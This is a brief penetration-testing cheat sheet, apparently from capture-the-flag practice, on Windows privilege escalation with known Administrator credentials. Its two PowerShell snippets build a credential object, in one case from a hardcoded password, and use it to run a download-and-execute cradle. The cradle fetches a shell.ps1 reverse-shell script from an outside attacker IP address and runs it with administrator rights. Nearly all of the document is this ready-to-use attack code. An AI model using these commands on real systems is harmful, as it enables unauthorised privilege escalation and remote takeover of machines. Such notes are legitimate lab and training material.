# Powershell privesc with known credentials (Administrator from Powerup)

## have to use credentials variable for using in Reverse_shell
```powershell
$SecPass = ConvertTo-SecureString 'Password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.10.2/shell.ps1')" -Credential $cred
```

## different Version

```
$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost
```

tags: powershell credentials ippsec chatterbox
